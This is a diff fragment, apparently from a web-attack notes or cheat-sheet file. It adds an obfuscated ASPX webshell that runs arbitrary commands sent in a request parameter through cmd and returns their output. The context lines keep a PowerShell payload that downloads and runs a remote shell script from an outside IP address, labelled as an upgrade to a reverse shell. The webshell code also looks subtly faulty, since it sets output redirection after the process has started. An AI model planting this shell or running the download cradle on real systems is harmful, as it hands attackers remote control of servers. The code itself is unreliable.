@@ -114,6 +114,19 @@ protected void Page_Load(object sender, EventArgs e)
 </script>
 EOF
 
+# Obfuscated aspx webshell
+<%@ Page Language="C#" %>
+<%
+string x=Request["\x63"];
+var t=System.Type.GetType("System.Diagnostics.Process");
+var m=t.GetMethod("Start",new System.Type[]{typeof(string),typeof(string)});
+var p=(System.Diagnostics.Process)m.Invoke(null,new object[]{"cmd","/c "+x});
+p.StartInfo.RedirectStandardOutput=true;
+p.StartInfo.UseShellExecute=false;
+p.Start();
+Response.Write(p.StandardOutput.ReadToEnd());
+%>
+
 ?cmd=powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.63.165.73:8080/shell.ps1')" # upgrade to revshell
 ```
 
